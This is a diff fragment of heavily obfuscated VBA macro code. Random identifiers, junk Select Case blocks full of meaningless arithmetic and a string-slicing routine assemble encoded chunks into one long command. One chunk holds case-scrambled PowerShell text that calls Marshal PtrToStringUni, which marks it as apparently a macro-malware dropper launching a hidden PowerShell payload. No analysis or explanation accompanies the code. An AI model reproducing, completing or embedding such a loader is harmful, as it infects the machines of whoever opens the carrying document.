+lzADUBAcF = ltdHa("2%waBhADYANgAzADgAMABmADcAMQA3ADcAOABkADgANQA4AGIAZAAyADkAMAAxADkAOAA3ADEAMgAxADIAZQBjADAANwA5AGMAOAA1ADIAMQBmAGMAMwBhAGEANwBmADEAYgA2ADQANABhAGUAMgBmAW4n", 5 + LUpwB - LUpwB, 147 + LUpwB - LUpwB)
+Select Case kPnZO
+Case 41542
+zHZrZf = CStr(54211 * Log(VIJUMW) * 44727 - CoYZrC)
+EUAszY = 93006
+End Select
+Select Case umTJzd
+Case 82870
+NSpLN = CStr(50162 * Log(OTGmsi) * 44925 - DYnAqP)
+DkFkG = 99363
+End Select
+iSnWvnX = ltdHa("wMwA1AGEAMABjADAAOQAxAGUANwBhADMAZQBiADYAYQBjADcAYgA1AGYAMgBhADYAZAA2ADUANQBjADAAMABhAGIAOQAzAGYAOAAyAGEAYgAyAGMANwAyADAAMQA4ADYAOQAxAGMANABiAGUAOQAwAGMAYwA2ADQAMQAxADcANwBlAGIAMwBmAGMAZQAxADEANwA8wqzfB", 2 + FCXvFc - FCXvFc, 195 + FCXvFc - FCXvFc)
+Select Case WfwLWP
+Case 37313
+dZiQd = CStr(35043 * Log(rJMWsP) * 70381 - cAnoP)
+GcTfa = 93366
+End Select
+Select Case tMqfMD
+Case 22123
+fFihu = CStr(58606 * Log(fGlTw) * 26260 - qmOjv)
+kMmto = 47226
+End Select
+lUrzGfl = ltdHa("X1PkbUANgBmADAAOAA3ADAAOABlADEAZgA3AGIAMAAwADAAMQBmAGMAMQBiADUAMQBmADgAMQBhADYAZQA1AGIAOQA5ADAAMgA5AGIAYQAzADgANgA1AGEAZgAzADIAMQA0ADgAZQBlADkAYwA1ADIANAA0ADIAMwBhADYAYwBkAGEAMQA1AGUAYgA1ADZn", 6 + qjIIau - qjIIau, 184 + qjIIau - qjIIau)
+Select Case MaYcfZ
+Case 61670
+Npoua = CStr(62930 * Log(DzMwkY) * 41632 - QcHwa)
+TksWh = 7198
+End Select
+Select Case JZiRBv
+Case 79474
+QCuiHj = CStr(51477 * Log(LPLWK) * 28531 - Wcujz)
+OUIzf = 71941
+End Select
+EtKiNFmtKBU = ltdHa("HmADAAMgA0AGQAYQBmADUAZgA1ADAAYwA5AGIAYQAzAGIAMgAyADMAMABmADMAZQAxADMANQsK4zUnG", 2 + iJoWh - iJoWh, 71 + iJoWh - iJoWh)
+Select Case hQqjb
+Case 87471
+HtWBlJ = CStr(13299 * Log(wGpbuC) * 22902 - GLrjBh)
+jcuXSv = 48030
+End Select
+Select Case RBmPq
+Case 45901
+cjHczN = CStr(35666 * Log(FBcoNM) * 18936 - fLKbQs)
+aiZwzT = 40636
+End Select
+tuvbtTKbu = ltdHa("D@fAn3b16050a5345MgB8AFgARAB6AC8AYQBXAFcALwBlAGUAbQBlADcATQByAE8ATAArAEMAZwBUAGcAPQA9AHwAMwA4ADUAZgBkADIAMgAxAGMAOAAxADEANQBkADUAMABmAGY8l", 6 + uQbOdF - uQbOdF, 131 + uQbOdF - uQbOdF)
+Select Case QMMuim
+Case 91948
+ZZjFf = CStr(186 * Log(BMHWH) * 7929 - wUkGjw)
+QTYkPM = 53681
+End Select
+Select Case jziMjp
+Case 78543
+rlrVA = CStr(15098 * Log(ZUjirL) * 17995 - EoqCtq)
+jizPwR = 161
+End Select
+oiQOdDST = ltdHa("CJHN ([RUNTImE.inTErOpSeRVICes.MArshAL]::PtRtoStrInGUni([RuNTimE.INTeRopseRVIceS.MArsat", 5 + Rfsjw - Rfsjw, 81 + Rfsjw - Rfsjw)
+Select Case biAuaE
+Case 71800
+Uzfqi = CStr(48031 * Log(mTWSi) * 46180 - muiDFM)
+kLPZu = 10518
+End Select
+ZaGwdVXp = rRicSVWDOzJHaL + """" + ZwVCivFPWwYujo
+pwnTqYKXS = XTmDzvpwkqV + RkTHuCnqL + TdAUEiKU + ZaGwdVXp + Wjjiuzm + oiQOdDST + UELfRKWj + tuvbtTKbu + fjcTsGV + jBBBTEY + zOdnzKqXti + iSnWvnX + JwTmAREwIp + zCbKijUW + INkpbb + SHDGTtscGPP + EvLEsIaN + jjJbVENN + SqJsr + WpqupzdbKb + fqRuYJPGk + oRndTbQ + iVWaWw + hbOmkzzZV + VlJuMZ + PoUDfWMq + jXOhww + RmhUGRd + CvhaimhcqV + VPIBB + lUrzGfl + AMrinlJM + HOmsfoq + rnpYz + wnYqUPdTbWP + JzaiwDUUqV + DfUMYwYz + uaRANrjwvq + rhzcZNO + jqcKaEr + CPMIYoF + GSMwB + rUqav + ZUqos + COuac + BklbGjIJ + wpTktf + DBwnjUiThY + lzADUBAcF + pLHpo + DDvGzrkw + OCXnWZa + PDEQjD + EtKiNFmtKBU + EbfZzv + LDGFiHcR + fQYSVFdjsYC + cwYwXpT + LBMBrqn + MdDXESUVu + cRIIFk
+Select Case olRDs
+Case 44426
+mBMdu = CStr(51439 * Log(PwiYnT) * 31946 - mIJzMM)
+lcBmi = 90095
+End Select
+End Function
+Sub raGDos(JlmpQ)
+Select Case BWJYac
+Case 3799
+bjjAJj = CStr(2896 * Log(QcHCVY) * 67541 - jwtCEO)
+SdjAdz = 70126
+End Select
+End Sub
